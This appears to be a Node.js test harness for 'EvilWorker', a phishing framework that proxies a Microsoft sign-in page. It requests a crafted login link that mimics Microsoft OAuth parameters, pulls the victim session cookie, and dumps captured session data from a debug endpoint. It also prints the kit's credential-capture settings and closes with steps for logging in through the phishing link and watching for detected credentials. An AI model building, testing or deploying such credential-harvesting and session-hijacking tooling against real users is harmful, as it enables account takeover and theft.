const http = require('http');

// Simple test script for EvilWorker
function testEvilWorker() {
    console.log('🔍 Testing EvilWorker Framework\n');
    
    // Test 1: Health check
    console.log('1. Testing health endpoint...');
    const healthReq = http.request('http://localhost:3000/', (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            try {
                const health = JSON.parse(data);
                console.log(`✅ Health check: ${health.status}\n`);
                
                // Test 2: Phishing link
                testPhishingLink();
            } catch (e) {
                console.log(`❌ Health check failed: ${e.message}\n`);
            }
        });
    });
    healthReq.end();
}

function testPhishingLink() {
    console.log('2. Testing phishing link...');
    const phishingUrl = '/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F';
    
    const req = http.request(`http://localhost:3000${phishingUrl}`, (res) => {
        const cookies = res.headers['set-cookie'];
        console.log(`📊 Response status: ${res.statusCode}`);
        
        if (cookies) {
            console.log('✅ Session cookie set');
            console.log(`🍪 Cookie: ${cookies[0]}\n`);
            
            // Extract session ID
            const sessionMatch = cookies[0].match(/([^=]+)=([^;]+)/);
            if (sessionMatch) {
                const sessionId = sessionMatch[1];
                const sessionValue = sessionMatch[2];
                console.log(`📋 Session ID: ${sessionId}\n`);
                
                // Test 3: Session debug
                testSessionDebug(sessionId, sessionValue);
            }
        } else {
            console.log('❌ No session cookie set\n');
        }
    });
    req.end();
}

function testSessionDebug(sessionId, sessionValue) {
    console.log('3. Testing session debug endpoint...');
    const req = http.request('http://localhost:3000/session-debug', {
        headers: {
            'Cookie': `${sessionId}=${sessionValue}`
        }
    }, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            try {
                const sessionData = JSON.parse(data);
                console.log('📊 Session Data:');
                console.log(JSON.stringify(sessionData, null, 2));
                console.log('\n');
                
                // Test 4: Configuration
                testConfiguration();
            } catch (e) {
                console.log(`❌ Session debug failed: ${e.message}\n`);
            }
        });
    });
    req.end();
}

function testConfiguration() {
    console.log('4. Checking configuration...');
    try {
        const config = require('./config');
        console.log('⚙️ Current Configuration:');
        console.log(`   • Credential redirect enabled: ${config.credentials.enableRedirect}`);
        console.log(`   • Redirect URL: ${config.credentials.redirectUrl}`);
        console.log(`   • Credential keywords: ${config.credentials.credentialKeywords.join(', ')}`);
        console.log(`   • Credential fields: ${config.credentials.credentialFields.join(', ')}`);
        console.log(`   • Login endpoints: ${config.credentials.loginEndpoints.join(', ')}\n`);
    } catch (error) {
        console.log(`❌ Configuration check failed: ${error.message}\n`);
    }
    
    console.log('🔧 Next Steps:');
    console.log('   1. Open this phishing link in your browser:');
    console.log(`      http://localhost:3000/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F`);
    console.log('   2. Try to log in with test credentials');
    console.log('   3. Watch the server console for [CREDENTIAL_DETECTED] messages');
    console.log('   4. Check /session-debug endpoint to see captured data');
}

// Run the test
testEvilWorker();
